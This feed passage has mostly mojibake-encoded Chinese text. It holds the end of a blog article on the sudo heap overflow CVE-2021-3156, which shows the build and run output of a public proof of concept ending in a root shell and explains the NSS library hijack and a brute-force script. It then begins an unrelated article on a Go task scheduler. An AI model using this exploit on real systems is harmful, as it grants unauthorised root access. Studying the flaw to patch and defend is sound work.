<span class="hljs-built_in">rm</span> -rf libnss_X
<span class="hljs-built_in">mkdir</span> libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o <span class="hljs-string">'libnss_X/P0P_SH3LLZ_ .so.2'</span> lib.c
ubuntu@ubuntu:~/CVE-2021-3156$ ./sudo-hax-me-a-sandwich

** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;

  usage: ./sudo-hax-me-a-sandwich &lt;target&gt;

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

  manual mode:
    ./sudo-hax-me-a-sandwich &lt;smash_len_a&gt; &lt;smash_len_b&gt; &lt;null_stomp_len&gt; &lt;lc_all_len&gt;

ubuntu@ubuntu:~/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 1

** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;

using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 [<span class="hljs-string">'/usr/bin/sudoedit'</span>] (56, 54, 63, 212)
** pray <span class="hljs-keyword">for</span> your rootshell.. **
[+] bl1ng bl1ng! We got it!
<span class="hljs-comment"># id</span>
uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),118(lxd),1000(ubuntu)
<span class="hljs-comment"># whoami</span>
root
</code></pre>
<p>POC çš„ç®€æè¯·å‚è€ƒé™„å½•ã€‚</p>
<h2 data-id="heading-9">æ¼æ´æ ¸å¿ƒåŸç†</h2>
<h3 data-id="heading-10">ä»£ç é€»è¾‘é”™è¯¯</h3>
<p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œå¦‚æœç”¨æˆ·è¾“å…¥ä¸€ä¸ªç©ºæ ¼ï¼Œ<code>sudo</code> ä¼šæŠŠå®ƒå˜æˆ <code>\ </code>ã€‚ç¨åç¨‹åºåœ¨å¤„ç†æ—¶ï¼Œçœ‹åˆ° <code>\</code>ï¼Œå°±çŸ¥é“ä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯ç©ºæ ¼ï¼Œäºæ˜¯æŠŠç©ºæ ¼å­˜å…¥å†…å­˜ï¼Œå¹¶è·³è¿‡ <code>\</code>ã€‚è€Œæ”»å‡»è€…é€šè¿‡ç‰¹å®šçš„å‘½ä»¤ç»„åˆï¼ˆå¦‚ <code>sudoedit -s</code>ï¼‰ï¼Œç»•è¿‡äº†ç¬¬ä¸€æ­¥çš„â€œè½¬ä¹‰â€è¿‡ç¨‹ï¼Œç›´æ¥è¾“å…¥äº†ä¸€ä¸ªä»¥åæ–œæ  <code>\</code> ç»“å°¾çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ <code>cmd\</code>ã€‚</p>
<h3 data-id="heading-11">æ¼æ´è§¦å‘è¿‡ç¨‹</h3>
<p>å½“ <code>sudo</code> çœ‹åˆ°ç”¨æˆ·è¾“å…¥äº†å­—ç¬¦ä¸²ï¼Œä¼šå…ˆè®¡ç®—é•¿åº¦ï¼Œç„¶ååœ¨å†…å­˜ï¼ˆå †ï¼‰ä¸­ç”³è¯·ä¸€å—åˆšå¥½å¤Ÿå¤§çš„ç©ºé—´ï¼ˆç¼“å†²åŒºï¼‰ã€‚å½“ç¨‹åºå¼€å§‹æŠŠå­—ç¬¦ä¸²å¤åˆ¶åˆ°è¿™å—ç©ºé—´æ—¶ï¼Œå®ƒé‡åˆ°äº†å­—ç¬¦ä¸²æœ«å°¾çš„ <code>\</code>ã€‚</p>
<p>æŒ‰ç…§ç¨‹åºçš„é€»è¾‘ï¼šé‡åˆ° <code>\</code>ï¼Œå°±è·³è¿‡å®ƒï¼Œå»è¯»ä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚ä½†æ­¤æ—¶ <code>\</code> åé¢å·²ç»æ˜¯<strong>å­—ç¬¦ä¸²ç»“æŸç¬¦</strong>ï¼ˆNullå­—èŠ‚ï¼‰äº†ã€‚ç¨‹åºç›²ç›®åœ°è·³è¿‡äº†ç»“æŸç¬¦ï¼Œç»§ç»­å¾€åè¯»ï¼Œå®ƒä¼šç»§ç»­æŠŠå†…å­˜ä¸­ä¸è¯¥å¤åˆ¶çš„æ•°æ®ï¼ˆæ¯”å¦‚æ”»å‡»è€…é¢„å…ˆåŸ‹å¥½çš„æ¶æ„ä»£ç ï¼‰å¼ºè¡Œå¡è¿›å·²ç»åˆ†å¥½çš„å†…å­˜å—ä¸­ã€‚æ”»å‡»è€…åˆ©ç”¨æº¢å‡ºçš„æ•°æ®æ”¹å†™äº†ç¨‹åºçš„è¿è¡Œé€»è¾‘ï¼Œè®© <code>sudo</code> è¿™ä¸ªæ‹¥æœ‰æœ€é«˜æƒé™çš„è¿›ç¨‹å»æ‰§è¡Œæ”»å‡»è€…çš„å‘½ä»¤ï¼Œä»è€Œå®ç° <strong>root ææƒ</strong>ã€‚</p>
<h3 data-id="heading-12">å®ç°ææƒ</h3>
<p>å½“æ”»å‡»è€…é€šè¿‡ä¸Šè¿°æ–¹æ³•è®©å†…å­˜æº¢å‡ºåï¼Œåˆ©ç”¨æº¢å‡ºçš„æ•°æ®ï¼Œè¦†ç›–æ‰å†…å­˜ä¸­ <code>sudo</code> è¿è¡Œæ‰€éœ€çš„å…³é”®é…ç½®ï¼ˆæ¯”å¦‚è´Ÿè´£åŠ è½½æ’ä»¶çš„è·¯å¾„ï¼‰ã€‚è¿™æ—¶ <code>sudo</code> ä¼šè¯¯ä»¥ä¸ºæ”»å‡»è€…æä¾›çš„æ¶æ„æ–‡ä»¶æ˜¯åˆæ³•çš„æ’ä»¶ï¼Œå¹¶ä»¥ <strong>rootæƒé™</strong>å»è¿è¡Œå®ƒã€‚</p>
<h2 data-id="heading-13">é™„å½•</h2>
<h3 data-id="heading-14">ä»£ç ç®€æ</h3>
<h4 data-id="heading-15">hax.c</h4>
<p>è¿™æ®µä»£ç è´Ÿè´£åˆ©ç”¨ <code>sudo</code> çš„é€»è¾‘é”™è¯¯ï¼Œ<code>sudo</code> åœ¨å¤„ç†å‘½ä»¤è¡Œå‚æ•°æ—¶ï¼Œå¦‚æœå‘ç°åæ–œæ  <code>\</code>ï¼Œå®ƒä¼šè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªè½¬ä¹‰ç¬¦ï¼Œå¹¶è·³è¿‡å®ƒå»è¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚ä½†å¦‚æœ <code>\</code> åé¢ç›´æ¥æ˜¯å­—ç¬¦ä¸²çš„ç»“æŸç¬¦ <code>\0</code>ï¼Œå®ƒä¼šè¶Šè¿‡ <code>\0</code> ç»§ç»­å‘åè¯»å–ï¼Œå¯¼è‡´<strong>ç¼“å†²åŒºæº¢å‡º</strong>ã€‚</p>
<p>ä¸ºäº†ç¡®ä¿æ”»å‡»çš„ç²¾å‡†æ€§ï¼Œä»£ç é€šè¿‡ <code>smash_len_a</code> å’Œ <code>smash_len_b</code> ç­‰å˜é‡å‘å †å†…å­˜å¡«å……ç‰¹å®šé•¿åº¦çš„å­—ç¬¦ï¼Œå…¶æ ¸å¿ƒç›®çš„æ˜¯é€šè¿‡å †å†…å­˜ç®¡ç†ï¼Œå°†å†…å­˜ä¸­å…³é”®çš„ <code>service_user</code> ç»“æ„ä½“æ¨é€åˆ°é¢„å®šçš„æº¢å‡ºè·¯å¾„ä¸Šã€‚</p>
<p>åœ¨æº¢å‡ºå‘ç”Ÿæ—¶ï¼Œç¯å¢ƒå˜é‡ <code>s_envp</code> ä¸­ç²¾å¿ƒæ„é€ çš„å¤§é‡åæ–œæ è¯±å¯¼æŒ‡é’ˆå‘åæ»‘åŠ¨ç›´è‡³è¦†ç›– <code>service_user</code> ç»“æ„ä½“ä¸­çš„ <code>name</code> æŒ‡é’ˆã€‚æ­¤æ—¶ï¼Œç¨‹åºæ³¨å…¥çš„ä¼ªè£…å­—ç¬¦ä¸² <code>X/P0P_SH3LLZ_</code> ä¼šç²¾å‡†æ”¹å†™ <code>sudo</code> å†…éƒ¨è®°å½•çš„ NSS åº“åŠ è½½åœ°å€ã€‚è¿™ä¸€æ”¹åŠ¨ä½¿ç³»ç»Ÿä¸å†åŠ è½½æ ‡å‡† <code>libnss_files.so.2</code> ï¼Œè½¬è€ŒåŠ è½½æ”»å‡»è€…æŒ‡å®šçš„æ¶æ„è·¯å¾„ã€‚</p>
<h4 data-id="heading-16">lib.c</h4>
<p>è¿™æ®µä»£ç è¢«ç¼–è¯‘æˆ <code>libnss_X/P0P_SH3LLZ_.so.2</code>ã€‚å®ƒçœ‹èµ·æ¥åƒä¸ªåº“ï¼Œå…¶å®æ˜¯ä¸ªææƒå¼€å…³ã€‚</p>
<p>åˆ©ç”¨ Linux åŠ¨æ€åŠ è½½å™¨çš„ <code>__attribute__((constructor))</code> ç‰¹æ€§ï¼Œåº“ä¸­çš„ <code>_init</code> å‡½æ•°ä¼šåœ¨è¢«åŠ è½½è¿›å†…å­˜çš„åˆ¹é‚£è‡ªåŠ¨æ‰§è¡Œã€‚ç”±äºæ­¤æ—¶ <code>sudo</code> è¿›ç¨‹å·²å…·å¤‡ root ç‰¹æƒï¼Œè½½è·å¾—ä»¥åœ¨é«˜æƒé™çŠ¶æ€ä¸‹è¿è¡Œï¼Œé€šè¿‡æ‰§è¡Œ <code>setuid(0)</code> å’Œ <code>setgid(0)</code> å°†è¿›ç¨‹èº«ä»½å½»åº•é”å®šä¸ºè¶…çº§ç®¡ç†å‘˜ï¼Œå¹¶æœ€ç»ˆé€šè¿‡ <code>execv</code> å”¤èµ·ä¸€ä¸ªæ‹¥æœ‰ <code>#</code> æç¤ºç¬¦çš„ root Shellã€‚</p>
<h4 data-id="heading-17">brute.sh</h4>
<p>ç”±äºä¸åŒç³»ç»Ÿçš„å†…å­˜å¸ƒå±€ï¼ˆå †çš„èµ·å§‹åœ°å€ã€ç¯å¢ƒå˜é‡å¤§å°ï¼‰ä¸åŒï¼Œ<code>hax.c</code> é‡Œçš„é‚£å‡ ä¸ªå¡«å……é•¿åº¦ï¼ˆsmash_lenï¼‰å¿…é¡»éå¸¸ç²¾ç¡®ï¼Œå·®ä¸€ä¸ªå­—èŠ‚éƒ½ä¼šå¯¼è‡´ç¨‹åºå´©æºƒã€‚</p>
<p>è„šæœ¬é€šè¿‡ä¸‰å±‚åµŒå¥—å¾ªç¯ï¼Œç”Ÿæˆäº†æˆåƒä¸Šä¸‡ç§å‚æ•°ç»„åˆï¼ˆåç§»é‡ï¼‰ã€‚åˆ©ç”¨ <code>parallel</code>ï¼Œè„šæœ¬å¯ä»¥åŒæ—¶å¯åŠ¨ 10 ä¸ªç”šè‡³ 20 ä¸ª <code>sudo</code> è¿›ç¨‹è¿›è¡Œæ”»å‡»å°è¯•ï¼Œå®ƒä¸çœ‹æ˜¯å¦å¼¹å‡ºäº† Shellï¼Œè€Œæ˜¯ç›‘æµ‹æ—¥å¿—æˆ–æ ‡å‡†è¾“å‡ºä¸­æ˜¯å¦å‡ºç°äº† <code>bl1ng bl1ng!</code>ï¼ˆè¿™æ˜¯ <code>lib.c</code> æ‰“å°çš„ï¼‰ã€‚åªè¦çœ‹åˆ°è¿™å¥è¯ï¼Œå°±è¯´æ˜è¿™ç»„å‚æ•°å®Œç¾ç»•è¿‡äº†å†…å­˜å¯¹é½ï¼ŒæˆåŠŸåŠ«æŒäº†åŠ è½½æµç¨‹ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[golangå®ç°ã€ä»»åŠ¡è°ƒåº¦ç®¡ç†ç³»ç»Ÿã€‘å¼€å‘æµç¨‹è¯¦è§£]]></title>    <link>https://juejin.cn/post/7600508556124864563</link>    <guid>https://juejin.cn/post/7600508556124864563</guid>    <pubDate>2026-01-29T07:59:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600508556124864563" data-draft-id="7600508556124700723" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="golangå®ç°ã€ä»»åŠ¡è°ƒåº¦ç®¡ç†ç³»ç»Ÿã€‘å¼€å‘æµç¨‹è¯¦è§£"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-29T07:59:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å…‰å¤´é—ªäº®äº®"/> <meta itemprop="url" content="https://juejin.cn/user/1333047014199326"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            golangå®ç°ã€ä»»åŠ¡è°ƒåº¦ç®¡ç†ç³»ç»Ÿã€‘å¼€å‘æµç¨‹è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1333047014199326/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å…‰å¤´é—ªäº®äº®
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T07:59:29.000Z" title="Thu Jan 29 2026 07:59:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»18åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">golangå®ç°ã€ä»»åŠ¡è°ƒåº¦ç®¡ç†ç³»ç»Ÿã€‘å¼€å‘æµç¨‹è¯¦è§£</h2>
<h3 data-id="heading-1">ä¸€ã€ç³»ç»Ÿæ¦‚è¿°</h3>
<p>æœ¬ä»»åŠ¡è°ƒåº¦ç®¡ç†ç³»ç»Ÿæ˜¯åŸºäºGoè¯­è¨€å¼€å‘çš„ä¸€ä¸ªå®Œæ•´çš„ä»»åŠ¡è°ƒåº¦å¹³å°ï¼Œé‡‡ç”¨å‰åç«¯åˆ†ç¦»æ¶æ„ï¼Œåç«¯ä½¿ç”¨Goè¯­è¨€çš„Irisæ¡†æ¶ï¼Œå‰ç«¯ä½¿ç”¨Vue3+HTML5å®ç°ã€‚ç³»ç»Ÿä¸»è¦åŠŸèƒ½åŒ…æ‹¬ï¼š</p>
<ul>
<li>ä»»åŠ¡çš„åˆ›å»ºã€ç¼–è¾‘ã€åˆ é™¤ã€å¯åŠ¨/ç»ˆæ­¢ã€æš‚åœ/ç»§ç»­ç­‰åŸºæœ¬æ“ä½œ</li>
<li>æ”¯æŒä¸€æ¬¡æ€§ä»»åŠ¡å’Œå‘¨æœŸæ€§ä»»åŠ¡ä¸¤ç§ç±»å‹</li>
<li>å‘¨æœŸæ€§ä»»åŠ¡æ”¯æŒCronè¡¨è¾¾å¼é…ç½®æ‰§è¡Œæ—¶é—´</li>
<li>ä»»åŠ¡æ‰§è¡ŒçŠ¶æ€å®æ—¶ç›‘æ§ï¼ˆç­‰å¾…æ‰§è¡Œã€æ­£åœ¨æ‰§è¡Œã€å·²å®Œæˆã€å·²è¶…æœŸï¼‰</li>
<li>ä»»åŠ¡æ‰§è¡Œç»“æœè®°å½•ä¸å±•ç¤º</li>
<li>è¶…æœŸä»»åŠ¡è‡ªåŠ¨å¤„ç†</li>
<li>ä»»åŠ¡æ‰§è¡Œç»Ÿè®¡åˆ†æ</li>
<li>ä»»åŠ¡æ‰§è¡Œæ—¥å¿—æŸ¥è¯¢</li>
<li>é«˜é¢‘æ‰§è¡Œä»»åŠ¡è¯†åˆ«ä¸ç›‘æ§</li>
</ul>
<p>ç³»ç»Ÿæ¶æ„æ¸…æ™°ï¼Œä»£ç ç»„ç»‡åˆç†ï¼Œå…·æœ‰è‰¯å¥½çš„å¯æ‰©å±•æ€§å’Œå¯ç»´æŠ¤æ€§ï¼Œå¯åº”ç”¨äºå„ç§éœ€è¦è‡ªåŠ¨åŒ–ä»»åŠ¡è°ƒåº¦çš„åœºæ™¯ã€‚</p>
<h3 data-id="heading-2">äºŒã€è¿è¡Œæ•ˆæœå›¾ç‰‡å±•ç¤º</h3>
<h4 data-id="heading-3">1. ä»»åŠ¡åˆ—è¡¨é¡µé¢</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f76a3bc15684abf9e6e83ad3fbd3528~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YWJ5aS06Zeq5Lqu5Lqu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770278368&amp;x-signature=vwrIUOFJvMt1WvNdcZ9JLlkDQzo%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c2927840d70d46c0b969fc6632c15c1d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YWJ5aS06Zeq5Lqu5Lqu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770278368&amp;x-signature=j3WJm7bEzsjAd9UdXZ5uOWDV1gs%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-4">2. æ–°å¢ä»»åŠ¡é¡µé¢</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4cc4a4cdd27e470b8a5a00fac8eb235e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YWJ5aS06Zeq5Lqu5Lqu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770278368&amp;x-signature=q4VJtSEY7lUY%2BcsTbTNsdgmfg%2FE%3D" alt="image.png" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a94abc651a54467596220df9328235b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YWJ5aS06Zeq5Lqu5Lqu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770278368&amp;x-signature=1M1l2Q6BjiIV5BAF7gs%2FEJ%2FF91U%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-5">3. ä¿®æ”¹ä»»åŠ¡é¡µé¢</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9efe22d30824c5bba70f238165a92b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YWJ5aS06Zeq5Lqu5Lqu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770278368&amp;x-signature=%2FF%2FyyXHEz%2Fj%2BV18SdYJtCrPqysI%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-6">4. ä»»åŠ¡æ—¥å¿—é¡µé¢</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ccc07d68a16d45619bb80492a52a1067~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YWJ5aS06Zeq5Lqu5Lqu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770278368&amp;x-signature=envJ6lRJ1IU5TNgSu9kxm0IlwpQ%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-7">5. Cronè¡¨è¾¾å¼è®¾ç½®</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6cf29313066941c0ac6a80a41762b8ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YWJ5aS06Zeq5Lqu5Lqu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770278368&amp;x-signature=O4d3t5cZ%2BuSZ%2BUy%2BGJToD93QSvE%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-8">6. ä»»åŠ¡ç»Ÿè®¡é¡µé¢</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fdd9885ed3b849ce8c9485cc69567c11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YWJ5aS06Zeq5Lqu5Lqu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770278368&amp;x-signature=uZCodVI3JopWyuTK0QtatwT5%2BNc%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-9">ä¸‰ã€é¡¹ç›®ç»“æ„</h3>
<p>æœ¬é¡¹ç›®é‡‡ç”¨å…¸å‹çš„Goè¯­è¨€é¡¹ç›®ç»“æ„ï¼Œéµå¾ªMVCæ¶æ„æ¨¡å¼ï¼Œä»£ç ç»„ç»‡æ¸…æ™°åˆç†ã€‚ä¸»è¦ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-plaintext" lang="plaintext">TaskSchedulingService/
â”œâ”€â”€ controller/         # æ§åˆ¶å™¨å±‚ï¼Œå¤„ç†HTTPè¯·æ±‚
â”‚   â””â”€â”€ task_controller.go
â”œâ”€â”€ core/               # æ ¸å¿ƒåŠŸèƒ½æ¨¡å—
â”‚   â””â”€â”€ cron.go
â”œâ”€â”€ external_call_result/  # å¤–éƒ¨è°ƒç”¨ç»“æœå­˜å‚¨
â”œâ”€â”€ global/             # å…¨å±€å˜é‡å’Œé…ç½®
â”‚   â””â”€â”€ global.go
â”œâ”€â”€ initialize/         # åˆå§‹åŒ–æ¨¡å—
â”‚   â”œâ”€â”€ initDatabase.go
â”‚   â””â”€â”€ timer.go
â”œâ”€â”€ middleware/         # ä¸­é—´ä»¶
â”‚   â””â”€â”€ cors.go
â”œâ”€â”€ model/              # æ•°æ®æ¨¡å‹
â”‚   â””â”€â”€ task_model.go
â”œâ”€â”€ router/             # è·¯ç”±é…ç½®
â”‚   â””â”€â”€ router.go
â”œâ”€â”€ scripts/            # è„šæœ¬å·¥å…·
â”‚   â”œâ”€â”€ add_cron_expressions.go
â”‚   â””â”€â”€ verify_cron_expressions.go
â”œâ”€â”€ service/            # ä¸šåŠ¡é€»è¾‘å±‚
â”‚   â””â”€â”€ task_service.go
â”œâ”€â”€ static/             # é™æ€èµ„æº
â”‚   â””â”€â”€ js/
â”‚       â”œâ”€â”€ axios.min.js
â”‚       â”œâ”€â”€ echarts.min.js
â”‚       â””â”€â”€ vue.global.js
â”œâ”€â”€ template/           # å‰ç«¯æ¨¡æ¿
â”‚   â””â”€â”€ index.html
â”œâ”€â”€ timer/              # ä»»åŠ¡å®šæ—¶å™¨
â”‚   â”œâ”€â”€ dynamic_task.go
â”‚   â”œâ”€â”€ scenario_tasks.go
â”‚   â””â”€â”€ simple_task.go
â”œâ”€â”€ utils/              # å·¥å…·å‡½æ•°
â”‚   â””â”€â”€ port_utils.go
â”œâ”€â”€ config.json         # é…ç½®æ–‡ä»¶
â”œâ”€â”€ go.mod              # Goæ¨¡å—å®šä¹‰
â”œâ”€â”€ go.sum              # Goä¾èµ–æ ¡éªŒ
â””â”€â”€ main.go             # é¡¹ç›®å…¥å£
</code></pre>
<p><strong>æ ¸å¿ƒç›®å½•è¯´æ˜ï¼š</strong></p>
<ul>
<li><strong>controller/</strong>: æ§åˆ¶å™¨å±‚ï¼Œå¤„ç†HTTPè¯·æ±‚ï¼Œå®ç°RESTful APIæ¥å£</li>
<li><strong>model/</strong>: æ•°æ®æ¨¡å‹å±‚ï¼Œå®šä¹‰ä»»åŠ¡å’Œæ‰§è¡Œæ—¥å¿—çš„æ•°æ®ç»“æ„</li>
